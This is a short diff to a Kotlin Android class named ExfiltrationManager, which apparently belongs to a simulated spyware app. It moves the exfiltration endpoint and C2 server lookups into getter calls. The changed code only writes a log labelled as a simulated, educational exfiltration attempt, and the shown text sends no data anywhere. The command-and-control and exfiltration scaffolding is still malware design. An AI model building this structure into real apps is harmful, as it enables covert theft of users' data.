@@ -33,7 +33,7 @@ class ExfiltrationManager(private val context: Context) {
     private val encryptionKey = C2Config.ENCRYPTION_KEY.toByteArray()
     
     // Get C&C server URL from global config
-    private val commandServer = C2Config.EXFILTRATION_ENDPOINT
+    private fun getExfiltrationEndpoint() = C2Config.getExfiltrationEndpoint()
     
     /**
      * Start the exfiltration schedule
@@ -75,8 +75,8 @@ class ExfiltrationManager(private val context: Context) {
             exfilLog.writeText(
                 "SIMULATED DATA EXFILTRATION\n" +
                 "Timestamp: $timestamp\n" +
-                "Target: $commandServer\n" +
-                "C2 Server: ${C2Config.SERVER_URL}\n" +
+                "Target: ${getExfiltrationEndpoint()}\n" +
+                "C2 Server: ${C2Config.getServerUrl()}\n" +
                 "Status: This is a simulated attempt for educational purposes only\n"
             )
             
